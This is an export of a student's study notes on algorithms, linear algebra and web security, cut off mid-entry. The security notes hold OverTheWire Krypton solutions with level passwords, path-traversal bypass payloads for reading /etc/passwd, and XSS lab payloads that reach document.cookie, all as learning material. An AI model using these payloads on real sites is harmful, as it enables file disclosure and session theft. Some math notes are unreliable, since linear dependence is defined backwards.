{"/notes/OvertheWire-Krypton":{"title":"OvertheWire Krypton","date":"2022-01-17T05:21:09+01:00","description":null,"tags":["cs/security","cs/cryptography"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"- [[/notes/krypton0&1|krypton0 && krypton1]]\n- [[/notes/krypton2|krypton2]]\n- [[/notes/krypton3|krypton3]]\n- [[/notes/krypton4|krypton4]]\n- [[/notes/krypton5|krypton5]]\n- [[/notes/krypton6|krypton6]]"},"/notes/Solving-Vigenere":{"title":null,"date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"When solving [[/notes/Vigenere|The vigenere cipher]], if we know the key's length. let's call it *n*, we can split the string into n blocks so that we have *n* unique strings that can be treated as separate english texts and run a frequency analysis on each of the blocks. This way, we can separately calculate each character of the key. Here is a small python script that aims to solve vigenere with known key length. If the key length is unknown, this function can be called over and over with different key lengths:\n\n```python\ndef letter_freq(string):\n    counts = [0]*26\n    freqs = {}\n    for i in string:\n        c = ord(i.upper()) - 65\n        if -1 < c < 26:\n            counts[c] += 1\n    for i in range(26):\n        freqs[chr(i+65)] = counts[i]/len(string)\n    return freqs\n\ndef shiftback(s,c):\n    f = \"\"\n    for i in s:\n        foo = ord(i) - ord(c)\n        if foo < 0:\n            f += chr(foo + 26 + 65)\n        else:\n            f += chr(foo + 65)\n    return f\n\ndef calcoffset(s):\n    freqs={'E': 0.12,'T': 0.091,'A': 0.0812,'O': 0.0768,'I': 0.0731,'N': 0.0695,'S': 0.0628,'R': 0.0602,'H': 0.0592,'D': 0.0432,'L': 0.0398,'U': 0.0288,'C': 0.0271,'M': 0.0261,'F': 0.023,'Y': 0.0211,'W': 0.0209,'G': 0.0203,'P': 0.0182,'B': 0.0149,'V': 0.0111,'K': 0.0069,'X': 0.0017,'Q': 0.0011,'J': 0.001,'Z': 0.0007}\n    probs = {}\n    for i in range(26):\n        p = 0\n        foo = shiftback(s,chr(i+65))\n        f = letter_freq(foo)\n        for j in f:\n            p += abs(f[j] - freqs[j])/2\n        probs[chr(65+i)] = p\n    best = (0,1)\n    for i in probs:\n        if probs[i] < best[1]:\n            best = (i,probs[i])\n    return best\n\ndef slice(s,l):\n    slices = []\n    for i in range(l):\n        substr = \"\"\n        for c in range(i, len(s), l):\n            substr += s[c]\n        slices.append(substr)\n    return slices\n\ndef findkey(s,keylen):\n    key = \"\"\n    chances = 1\n    slices = slice(s,keylen)\n    for i in slices:\n        (c,prob) = calcoffset(i)\n        chances -= prob/keylen\n        key += c\n    return key,chances\n\ndef decrypt(s,key):\n    d = \"\"\n    for i in range(len(s)):\n        d+=shiftback(s[i],key[i%len(key)])\n    return d\n\ndef solve(s,cipher,mkl=20,keylen=None):\n    s = s.replace(\" \",\"\").upper()\n    cipher = cipher.replace(\" \",\"\").upper()\n    if keylen:\n        best = findkey(cipher,keylen)\n        return [(decrypt(s,best[0]),best[0],best[1])]\n    else:\n        keys = []\n        for i in range(1,mkl+1):\n            res = findkey(cipher,i)\n            keys.append((decrypt(s,res[0]),res[0],res[1]))\n        return sorted(keys, key=lambda tup: tup[2],reverse=True)\n```","tags":null,"aliases":null,"description":null},"/notes/Path-Traversal":{"title":"File Path Traversal","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web"],"lastmodified":"2022-06-19T20:46:41.318597","content":"File path traversal vulnerabilities allow an attacker to read/write arbitrary files in a web server. This ability can be used to leak sensitive information or, in case of writing, can be used to escalate to OS Command injection.\n\n## Basic Path Traversal\n\nWhen the web application does not properly sanitise the parameters where a filename is expected, it could be possible to inject `../` s on the path which could allow an attacker to access files higher in the directory hierarchy.\n\n## Bypassing Protections\n\n### Absolute Paths\n\nEven when a web app does not respond to request like `?file=../../../../.././../etc/passwd` as the attacker wants, it could still be possible to access files using absolute filenames like `?file=/etc/passwd`.\n\n### Sanitisation of Path Traversal Payloads\n\nWhen a web applications sanitises payloads like `../`, if it doesn\\'t remove them recursively it could be possible to still access files in the higher directories using payloads like `....//` since when sanitised it would still be valid(`....//` -\\> `.[../]` -\\> `../`)\n\n### URL Encoding\n\nIn the cases where we try to bypass a middleware that blocks/sanitises our input, we can play around with the encoding of our inputs which can allow us to bypass the middleware\\'s protection. In order to bypass, we can use [Overlong Unicode Encoding](web_bypasses.org::*Overlong Unicode Encoding) and [Double URL Encoding](web_bypasses.org::*Double URL Encoding).\n\n### Start of Path Checks\n\nSome web applications that allow users to access the files using an absolute path, check whether the path provided by the user starts with a certain path. This can easily be bypasses using the `../` method by sending a request like `?path=/tmp/access/../../../../etc/passwd`. This can be combined with previous techniques to bypass any other protections of they exist.\n\n### Validation of File Extension\n\nThis is a tough one, however sometimes, when an application checks the end of string, without controlling for null bytes, we can add a `%00` right before the file extension in order to trick the web application into thinking we are sending a valid request while the operating systems accesses the file without the extension since a null byte is used as a string t","aliases":null,"description":null},"/notes/Quick-Select":{"title":"Quick Select","date":"2021-12-27T01:17:19+03:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Quick Select is an algorithm similar to [[/notes/Quick Sort|Quick Sort]], except it does not sort a given but finds the nth smallest element in an array in $O(n)$ time. However, this algorithm has a [[/notes/Big-Theta Notation|worst case time complexity]] of $O(n^2)$ since the recursion tree can be imbalanced. Here is the pseudocode for a function that finds the kth smallest element in an array A:\n\n```\nQuickSelect(n, k):\n\tPopulate L, E, G arrays according to a randomly chosen pivot\n\tif len(L) >= k:\n\t\treturn QuickSelect(L,k)\n\telse if len(L) + len(E) >= k:\n\t\treturn E[0]\n\telse:\n\t\treturn QuickSelect(G,k - (len(L)+len(E))\n```"},"/notes/Merging-in-Merge-Sort":{"title":"Merging in Merge Sort","date":"2021-12-21T07:59:57+03:00","description":null,"tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"After the recursive calls return two sorted lists, you need to merge them. Since they are both sorted, merging them into a new sorted list can be done in $O(n)$ complexity. Here is a subsequent java code that would achieve this:\n\n```java\npublic static int[] merge(int[] l1, int[] l2){\n\tint[] merged = new int[l1.length + l2.length];\n\tint i = 0;\n\tint j = 0;\n\twhile(i + j < merged.length){\n\t\tif(i < l1.length && (l2.length <= j || l1[i] > l2[j]))\n\t\t\tmerged[i+j] = l1[i++];\n\t\telse\n\t\t\tmerged[i+j] = l2[j++];\n\t}\n\treturn merged;\n}\n```"},"/notes/krypton6":{"title":"krypton6","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"When we pass a bunch of \"A\"s into to the encryption binary, we get a repeating pattern `EICTDGYIYZKTHNSIRFXYCPFUEOCKRN`. We can then simply use this to calculate the original text:\n\n``` python\nciphertext=\"EICTDGYIYZKTHNSIRFXYCPFUEOCKR\"\nstring=\"PNUKLYLWRQKGKBE\"\ndecrypted = \"\"\nfor i in range(len(string)):\n    k =  ord(string[i]) - ord(ciphertext[i]) + 65\n    if k < 65:\n        k += 26\n    decrypted += chr(k)\nreturn decrypted\n```","aliases":null,"description":null},"/notes/Directional-Derivative":{"title":"Directional Derivative","date":"2022-01-19T04:18:20+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The directional derivative of a [[/notes/Multivariable Functions|multivariable function]] is the rate of change of a function $f(x,y)$ at the direction of a **unit vector** $u$. In order to calculate its directional derivative, we also need its [[/notes/Multivalued Function Gradient|gradient]]. After knowing it, we can simply calculate the dot product of the two [[/notes/Vectors|Vectors]] and that gives us that function's directional derivative at $(x,y)$ with direction $u$:\n\n$$D_u(x,y) = \\triangledown f(x,y) \\cdot u$$"},"/notes/Red-Black-Tree-Insertions":{"title":"Red-Black Tree Insertions","date":"2022-01-05T08:42:32+03:00","description":null,"tags":["cs/trees","cs/data-structures","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"After inserting into a [[/notes/Red-Black Trees|red black tree]] just like a [[/notes/Binary Search Trees|BST]], the newly inserted node is colored red. If its parent is black, then no property of the Red-Black tree is broken. If its parent is red however, the **Red Property** is broken since than a red node would have a red child. One of two cases may occur:\n\n## The sibling  of the inserted node's parent is Black\nBasically, we perform [[/notes/Binary Tree Restructuring|Binary Tree Restructuring]] operation from the newly inserted node $x$. Afterwards, we recolor $a$ and $c$ red and $b$ black. If these references are unclear, you can refer to the note on restructuring. This operation needs to be run only once, so it has $O(1)$ time complexity.\n\n ## The sibling of the inserted node's parent is Red\nIn this case, a recoloring is performed as such:\n![[images/42E5AB77-8C8C-49D3-A246-7F6DBD5604F5.jpeg]]\nThis operation can cause the red property to be broken in the parent, so a recoloring is performed until we reach the root of the tree. So this operation runs in $O(log(n))$ time."},"/notes/XSS-Vectors":{"title":"XSS Vectors","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web"],"lastmodified":"2022-06-19T20:46:41.322597","content":"- [ ] Split into multiple notes\n# XSS Vectors\n## XSS Vector Without Spaces, Using Throw\n\nThis payload is taken from the portswigger academy [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked). The request url is the following `/post?postId=5&%27},x=x=%3E{onerror=alert;throw/**/1337},toString=x,window+'',{x:'<`. When the request is sent, the injected html looks like this:\n\n``` html\n<a href=\"javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{onerror%3dalert%3bthrow/**/1337},toString%3dx,window+%27%27,{x%3a%27%3c'}).finally(_ => window.location = '/')\">Back to Blog</a>\n```\n\nWhen we extract just the href attribute, remove the javascript prefix and url-decode everything(remember, since we are in an href, url encoded values are actually used in their decoded form, so even though the \\' is encoded to %27, it still closes the previous single quote) we are left with the js code:\n\n``` javascript\nfetch('/analytics',\n  {method:'post',body:'/post?postId=5&'},x=x=>{onerror=alert;throw/**/1337},toString=x,window+''\n      ,{x:''}).finally(_ => window.location = '/')\n```\n\nWhat this vector does can be split up into steps:\n\n1.  close the `body:` of the dictionary and close the dictionary, and add a new parameter to the call of the `fetch()` function.\n2.  In this new call, define a new function `x` that always throws the error `1337` a. When the function is called, `window.onerror` is set to the `alert` function, so every error thrown in `x()` is passed to `alert` b. then, we throw an error with the message `1337` c. `x(x)` also has a parameter named x, this is because we use the x function as a substitute for `toString`. If we hadn\\'t defined it like that, the javascript interpreter would throw an error before we could even call `x`, therefore, our payload wouldn\\'t run.\n3.  Then, with `toString=x`, we set the toString function to x\n4.  Finally, we run `window+''`, which implicitly calls toString and therefore runs our malicious function x.\n5.  The rest are used to close the dictionary that we have injected into so that we end up with valid javascript.\n\n# DOM Based XSS message\n\n``` html\n<script>\nfunction message(){\ndocument.getElementById('xss').contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}','*');\n}\n</script>\n\n<iframe height=1000 width=1000 id=\"xss\" src=\"https://aca21f1a1ea5dc85808d28650079004d.web-security-academy.net/\" onload=\"message()\">\n</iframe>\n```","aliases":null,"description":null},"/notes/Implementing-Priority-Queues":{"title":"Implementing Priority Queues","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"There are two ways to implement [[/notes/Priority Queue|Priority Queue]]s:\n\n### Unsorted List\nIn this method, you insert the elements into the queue in the order that they have been added in. So, insertions take $O(1)$ time. However, removing the element with the highest priority takes $O(n)$ time.\n\n### Sorted List\nWhen adding elements into the queue, you add the element in a way so that the queue remains sorted. This makes the insert operation take more time($O(log_2n)$), but removing the element with the highest priority takes $O(1)$.","tags":null,"aliases":null,"description":null},"/notes/Equivalent-Systems":{"title":"Equivalent Systems","date":"2022-02-11T09:51:52+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Two linear systems are equivalent if they have the same [[/notes/Solutions of Linear Systems|solutions]]."},"/notes/krypton5":{"title":"krypton5","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"same method as *krypton4*\n\n```python\ndef letter_freq(string):\n    counts = [0]*26\n    freqs = {}\n    for i in string:\n        c = ord(i.upper()) - 65\n        if -1 < c < 26:\n            counts[c] += 1\n    for i in range(26):\n        freqs[chr(i+65)] = counts[i]/len(string)\n    return freqs\n\ndef shiftback(s,c):\n    f = \"\"\n    for i in s:\n        foo = ord(i) - ord(c)\n        if foo < 0:\n            f += chr(foo + 26 + 65)\n        else:\n            f += chr(foo + 65)\n    return f\n\ndef calcoffset(s):\n    freqs={'E': 0.12,'T': 0.091,'A': 0.0812,'O': 0.0768,'I': 0.0731,'N': 0.0695,'S': 0.0628,'R': 0.0602,'H': 0.0592,'D': 0.0432,'L': 0.0398,'U': 0.0288,'C': 0.0271,'M': 0.0261,'F': 0.023,'Y': 0.0211,'W': 0.0209,'G': 0.0203,'P': 0.0182,'B': 0.0149,'V': 0.0111,'K': 0.0069,'X': 0.0017,'Q': 0.0011,'J': 0.001,'Z': 0.0007}\n    probs = {}\n    for i in range(26):\n        p = 0\n        foo = shiftback(s,chr(i+65))\n        f = letter_freq(foo)\n        for j in f:\n            p += abs(f[j] - freqs[j])/2\n        probs[chr(65+i)] = p\n    best = (0,1)\n    for i in probs:\n        if probs[i] < best[1]:\n            best = (i,probs[i])\n    return best\n\ndef slice(s,l):\n    slices = []\n    for i in range(l):\n        substr = \"\"\n        for c in range(i, len(s), l):\n            substr += s[c]\n        slices.append(substr)\n    return slices\n\ndef findkey(s,keylen):\n    key = \"\"\n    chances = 1\n    slices = slice(s,keylen)\n    for i in slices:\n        (c,prob) = calcoffset(i)\n        chances -= prob/keylen\n        key += c\n    return key,chances\n\ndef decrypt(s,key):\n    d = \"\"\n    for i in range(len(s)):\n        d+=shiftback(s[i],key[i%len(key)])\n    return d\n\ndef solve(s,cipher,mkl=20,keylen=None):\n    s = s.replace(\" \",\"\").upper()\n    cipher = cipher.replace(\" \",\"\").upper()\n    if keylen:\n        best = findkey(cipher,keylen)\n        return [(decrypt(s,best[0]),best[0],best[1])]\n    else:\n        keys = []\n        for i in range(1,mkl+1):\n            res = findkey(cipher,i)\n            keys.append((decrypt(s,res[0]),res[0],res[1]))\n        return sorted(keys, key=lambda tup: tup[2],reverse=True)\n\nciphertext = \"<<concatanated>>\" # Too long, enter the contents of found1 or found2\nsolutions = solve('BELOS Z', ciphertext)\nfor i in range(3): # print the top 5\n    print(\"Key Found: \" + solutions[i][1])\n    print(\"Decrypted Text Is: \" + solutions[i][0])\n    print(\"Confidence: {0:.0f}%\".format(solutions[i][2]*100))\n```\n\nPassword is *RANDOM*","aliases":null,"description":null},"/notes/Special-Matrices":{"title":"Special Matrices","date":"2022-02-26T03:24:08+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"## Zero matrix\nA matrix with zeros instead of all its values:\n\n$$\n\\begin{bmatrix}\n0 & 0 & 0 & 0 \\\\\n0 & 0 & 0 & 0 \\\\\n0 & 0 & 0 & 0 \n\\end{bmatrix}\n$$\n\n## Square matrix\nA matrix with a square shape, $n \\times n$. Subtypes of the square matrix exist, especially defined by their diagonals:\n\n### Diagonal Matrix\nOnly the entries on the diagonals are not zeros\n\n### Identity matrix\n\n^81da11\n\nJust like a diagonal matrix, but all diagonals are 1\n\n### Lower/Upper triangular matrix\n\n^563d5a\n\nOne side of the diagonal must be all zeros"},"/notes/Cofactor":{"title":"Cofactor","date":"2022-03-06T10:31:49+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The cofactor $C_{ij}$ of a matrix $A$ is the [[/notes/Determinant|determinant]] of the [[/notes/Minor Matrix|Minor Matrix]] $A_{ij}$."},"/notes/ER-Diagrams":{"title":"ER Diagrams","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases","cs/diagrams"],"lastmodified":"2022-06-19T20:46:41.318597","content":"ER diagrams are used to model [[/notes/Entity|Entity]]s, their attributes and the relations between those entities. In ER diagramming, there are constructs and symbols relating to those constructs. Here they are:\n\n![[images/20211123095536.png]]","aliases":null,"description":null},"/notes/Partial-Derivatives":{"title":"Partial Derivatives","date":"2022-01-19T01:43:31+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When dealing with [[/notes/Multivariable Functions|Multivariable Functions]], it is hard to talk about regular derivations. Instead, we calculate the partial derivatives of the function according to a certain variable. Which is written as:\n$$f_x(x,y) = \\frac{\\partial f}{\\partial x}$$\n\nWhen calculating the partial derivative for a certain variable, the other variables are treated as constants.\n\n> Partial derivation is VERY different from implicit differentiation since here, y is an independent variable and not a function that is defined according to x. \n> For second-order derivatives and higher, the order of derivation doesn't matter due to [[/notes/Clairaut's Theorem|Clairaut's Theorem]]"},"/notes/krypton3":{"title":"krypton3","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"We have 3 files, translated from english text that were encrypted from the same key. Since they are originally english, we can have a general idea of the key by counting the frequency of each character.\n\n```\ncat found* | grep -o . | sort | uniq -c\n```\n\n![[images/54927D00-491D-425B-B10C-7DEF65DB25FE.jpeg|500]]\n\n[Website for more details](https:www3.nd.edu/~busiforc/handouts/cryptography/cryptography%20hints.html)\n\n**letter**|** count**|** frequency**|** equals**\n:-----:|:-----:|:-----:|:-----:\nP| 2| 2.8409091e-3| Z\nH| 4| 5.6818182e-3| Q\nR| 4| 5.6818182e-3| X\nO| 12| 0.017045455| J\nI| 19| 0.026988636| K\nF| 28| 0.039772727| V\nA| 55| 0.078125| B\nL| 60| 0.085227273| P\nE| 64| 0.090909091| Y\nK| 67| 0.095170455| G\nX| 71| 0.10085227| F\nT| 75| 0.10653409| W\nY| 84| 0.11931818| M\nM| 86| 0.12215909| U\nW| 129| 0.18323864| C\nV| 130| 0.18465909| L\nZ| 132| 0.1875| D\nD| 210| 0.29829545| R\nC| 227| 0.32244318| H\nG| 227| 0.32244318| S\nN| 240| 0.34090909| N\nB| 246| 0.34943182| I\nU| 257| 0.36505682| O\nJ| 301| 0.42755682| A\nQ| 340| 0.48295455| T\nS| 456| 0.64772727| E\nTOTAL| 704| 1| \n\n**Single Letter Counts and Frequencies:**\n\n```python\nciphertext = \"<<concatanted>>\"\npassword = \"KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS\"\norder = ['E','Q','T','S','O','R','I','N','H','C','L','D','U','P','M','F','W','G','Y','B','K','V','X','Q','J','Z']\n\ndef letter_order(string):\n    counts = [0]*26\n    order = \"\"\n    for i in string:\n        c = ord(i.upper()) - 65\n        if -1 < c < 26:\n            counts[c] += 1\n    for i in range(26):\n        m = (0,0)\n        for j in range(26):\n            if counts[j] > m[1]:\n                m = (j,counts[j])\n        counts[m[0]] = 0\n        order += chr(65+m[0])\n    return order\n\ndef genkeys(order):\n    if len(order) == 0:\n        return [\"\"]\n    keys = []\n    for i in range(len(order[0])):\n        if len(order[0]) > 1:\n            neworder = [order[0][0:i] + order[0][i+1:]] + order[1:]\n        else:\n            neworder = order[1:]\n        for j in genkeys(neworder):\n            keys.append(order[0][i]+j)\n    return keys\n\ndef solve(s,orig,ceasar):\n    solved = \"\"\n    for i in s:\n        if 64 < ord(i.upper()) < 91:\n            solved += orig[ceasar.find(i.upper())]\n    return solved\n\ncipherorder = letter_order(ciphertext)\nfor i in genkeys(order):\n    print(i)\n    print(cipherorder)\n    print(solve(password, i, cipherorder))\n```\n\n```\nEQTSORINHCLDUPMFWGYBKVXQJZ\nSQJUBNCGDZVWMYTXKELAFIOHRP\nWELLDONETHELEVELFOURPQSSWORDISBRUTE\n```\n\nThe password is *BRUTE*","aliases":null,"description":null},"/notes/Greedy-Method":{"title":"Greedy Method","date":"2022-01-24T03:40:54+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The greedy problem solving approach is the approach of picking the most locally optimal choice in each step. This design pattern often doesn't produce the globally optimal solution to a problem but yields a reasonably quick solution that is close enough to the globally optimal answer."},"/notes/Hash-Functions":{"title":"Hash Functions","date":"2021-12-31T12:54:13+03:00","description":null,"tags":["cs/algorithms","cs/theory","cs/security"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Hash functions are functions that take in data, or a stream of data and output a value that is set in size. This value often cannot be reversed to obtain the initial data and is unique for any data, input. Unless hash colissions occur."},"/notes/Linear-Indepence-and-Dependence":{"title":"Linear Indepence and Dependence","date":"2022-02-23T01:07:48+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A set of vectors are linearly dependent if:\n\n$$\n\\begin{bmatrix}\nv_1 & v_2 & v_3 & ... & v_n\n\\end{bmatrix} x = 0\n$$\n\nonly has the [[/notes/Trivial Solution|Trivial Solution]] as a solution. \n\nIt can also be said that the set is linearly dependent if a vector in the set is a linear combination of one or more vectors in the set.\n\nLinear dependency is also present if given a set of vectors ${v_1, v_2, ..., v_n}$, the equation $c_1v_1 + c_2v_2 + ... + c_nv_n = 0$ can be satisfied where not all the constants are 0.\n\n> If there are more than $n$ vectors in the set, each of which of size $\\mathbb{R}^n$ cannot be linearly independent.\n\n> If the zero vector is in the set, it is linearly dependent"},"/notes/Properties-of-Eigenvalues":{"title":"Properties of Eigenvalues","date":"2022-03-20T06:52:08+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"[[/notes/Eigenvalues|Eigenvalues]] have several properties:\n\n- [[/notes/Eigenvectors|Eigenvectors]] that correspond to different eigenvalues are linearly independent\n\t- This means that $n \\times n$ [[/notes/Matrixes|matrix]] can have at most $n$ different eigenvalues.\n\t\n- The eigenvalues for a [[/notes/Special Matrices#^563d5a|triangular matrice]] are the entries in its diagonal**."},"/notes/Indeterminate-Forms-in-Limits":{"title":"Indeterminate Forms and Dealing with Them","date":"2021-11-24T16:36:27+01:00","tags":["cs/calculus"],"lastmodified":"2022-06-19T20:46:41.318597","content":"An indeterminate form in calculus is an equation which doesn't have a value. Such as $\\frac{0}{0}$ or $\\frac{\\infty}{\\infty}$ or $0 \\times \\infty$. There are three techniques you need to know to solve such indeterminate forms.:\n* [[/notes/Cancelling Common Factors - Limit|Cancelling Common Factors]]\n* [[/notes/Square Root Trick - Limit|The Square Root Trick]]\n* [[/notes/The Squeeze Theorem - Limits|The Squeeze Theorem]]","aliases":null,"description":null},"/notes/Elementary-Row-Operations":{"title":"Elementary Row Operations","date":"2022-02-11T09:54:28+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Elementary row operations change an [[/notes/Augmented Matrix|Augmented Matrix]] while keeping it [[/notes/Equivalent Systems|equivalent]]. \n\n## Interchange rows\nInterchange the rows bby.\n\n## Multiply by factor\nThe factor cannot be 0.\n\n## Replace with multiple of another row\nMultiply a row and add it to another row."},"/notes/Kruskals-Algorithm":{"title":"Kruskal's Algorithm","date":"2022-01-24T04:28:32+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"In order to create the minimum spanning tree of a [[/notes/Graphs|graph]], the kruskal's algorithm takes the following approach:\n\n- Save each of the edges into a priority queue\n- Create $n$ clusters, each containing one of the vertices.\n- Remove the minimum entry from the priority queue.\n- If the nodes connected by the edge do not belong to the same cluster, we merge the two clusters. Add the removed edge to the tree.\n- repeat\n\nKruskal's algoritm runs in $O(mlogn)$ time. Where $m$ is the number of edges while $n$ is the number of vertices."},"/notes/Breadth-First-Search":{"title":"Breadth First Search","date":"2022-01-24T02:33:01+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Breadth first search, or [[/notes/Breadth-First Traversal|Breadth First Traversal]], similar to [[/notes/Depth-First Search|Depth-First Search]] is a traversal algorithm for [[/notes/Graphs|Graphs]]. I works in rounds, by splitting the graph into **levels** strarting from the start node $s$. A visual should be more than enough to explain it:\n\n![[images/Pasted image 20220124151203.png]]\n\nBreadth first search runs in $O(n+m)$ for a graph with $n$ vertices and $m$ edges."},"/notes/Taylor-Series":{"title":"Taylor Series","date":"2022-01-19T09:23:07+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"Taylor series are [[/notes/Power Series|Power Series]] which can describe a function $f$, which is continously differentiable. The taylor series of a function $f$ at the point $a$ is defined as:\n\n$$\n\\sum \\frac{f^{(n)}(x-a)^n}{n!}\n$$\n\nThis power series is equals to $f$ in an open interval which $a$ is in."},"/notes/Directed-Acyclic-Graphs":{"title":"Directed Acyclic Graphs","date":"2022-01-24T03:13:19+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"There is a special name for directed [[/notes/Graphs|Graphs]] without any cycles, directed acyclic graphs, or DAGs. For a DAG, there is an ordering of its vertices $v_1,v_2,...v_n$ such that for any edge $(v_i,v_j)$, $i<j$. If such an ordering exists, the graph is a DAG."},"/notes/Adjacency-Matrix":{"title":"Adjacency Matrix","date":"2022-01-23T03:37:30+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The adjacency matrix basically contains a matrix, in which each row and column is a vertice in the [[/notes/Graphs|graph]] and every single cell in the matrix corresponds to a possible edge. This method uses $O(n^2)$ space.\n\n![[images/Pasted image 20220123154025.png]]"},"/notes/Red-Black-Tree-Deletion":{"title":"Red-Black Tree Deletion","date":"2022-01-05T08:43:21+03:00","description":null,"tags":["cs/trees","cs/data-structures","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"After deleting from the [[/notes/Red-Black Trees|Red-Black Trees]] just like a [[/notes/Deleting  From A Binary Search Tree|BST]], the promoted node is colored black. However, this might break the black-depth property of the tree. \n\n## The Sibling of new node's parent(y) is black and has a red child(x)\nA [[/notes/Binary Tree Restructuring|trinode restructuring]] on x is performed and then a and c is colored black while b is given the color of the original node that were there before.\n\n## The Sibling of new node's parent(y) is black and has two black children\nIn this case a recoloring is performed so that y is colored red and y's parent is colored black. However, this recoloring might still break the black depth property for y's parent so mode recoloring is necessary traversing up the tree.\n\n## The sibling of node's parent(y) is red\nIn this case a [[/notes/Binary Tree Rotations|rotation]] about y is done. After this rotation, either case 1 or case 2 would apply and this tree can be continued to be fixed from there."},"/notes/DFS-and-Spanning-Trees":{"title":"DFS and Spanning Trees","date":"2022-01-24T02:30:59+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When running [[/notes/Depth-First Search|Depth-First Search]] on a [[/notes/Graphs|graph]], a spanning tree that is rooted at the algorithm's start node, $s$ is formed. This tree is guranteed to be spanning the whole [[/notes/Graph Terminology#^f18c89|connected component]] that $s$ is in."},"/notes/Calculating-Determinants":{"title":"Calculating Determinants","date":"2022-03-06T10:45:50+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Calculating [[/notes/Determinant|determinants]] with the concept of [[/notes/Cofactor|cofactor]] is relatively straight forward. Given an $n \\times m$ matrix $A$, the determinant is defined by one of the following formulas:\n\n$$\n\\forall k \\leq m : det(A) = \\sum_{i=0}^n -1^{i+k}a_{ik}C_{ik}\n$$\n\n$$\n\\forall k \\leq n : det(A) = \\sum_{i=0}^m -1^{i+k}a_{ki}C_{ki}\n$$\n\n> Notice that to calculate the determinant, we can pick any row/column we want, so it is best to pick one with **as many zeros as possible**.\n\n## Properties of Determinants\n- $det(A^T) = det(A)$\n- $det(AB) = det(A)det(B)$\n- $det(A^{-1}) = det(\\frac{1}{A})$"},"/notes/Queue":{"title":"Queue","date":"2021-11-23T09:00:33+01:00","tags":["cs/data-structures"],"lastmodified":"2022-06-19T20:46:41.318597","content":"A queue is a first in first out data structure that the added data are lined up just like a queue. The data structure works just like a real queue. As new data is added, it is added to the end-the tail- of the list and as data is removed, it is removed from the head. The user of the data structure only has access to the first entry on the head. Queues are closely related to [[/notes/Linked List|linked lists]] and can easily map using the following operations\n\n| **Linked List** | **Queue**|\n|-----------------|----------|\n|*removeFront()*|*unenqueue()*|\n|*addTail()*|*enqueue()*|\n|*getFront()*|*poll()*|","aliases":null,"description":null},"/notes/Consistent-and-Inconsistent-Systems":{"title":"Consistent and Inconsistent Systems","date":"2022-02-22T04:17:00+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Whether a system of linear equations has a [[/notes/Solutions of Linear Systems|solution]] is decided by whether the system is consistent or not.\n\nIf a system is inconsistent, iff there exists a row such that:\n\n$$\n\\begin{bmatrix}\n  0 & 0 & 0 & 0 & 0 & | & c\n\\end{bmatrix}\n$$\n\nOtherwise, the matrix is consistent.\n\n> A good rule of thumb to keep in mind is that if a matrice can be written in [[/notes/Echeleon Forms|echeleon form]], it is consistent."},"/notes/Priority-Queue":{"title":"Priority Queue","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Priority queues are data types similar to regular [[/notes/Queue|Queue]]s, except that they are not a *FIFO* data structure. Instead, each element in a priority queue has a **key** and a **value**. The elements are outputted using the **key** in the order that the element with the lowest key is outputted first. Even though keys are often thought to be integers, they can be any type of data thanks to the [[/notes/Comparables and Comparators|Comparables and Comparators]] in java.","tags":null,"aliases":null,"description":null},"/notes/Algebraic-and-Geometric-Multiplicity":{"title":"Algebraic and Geometric 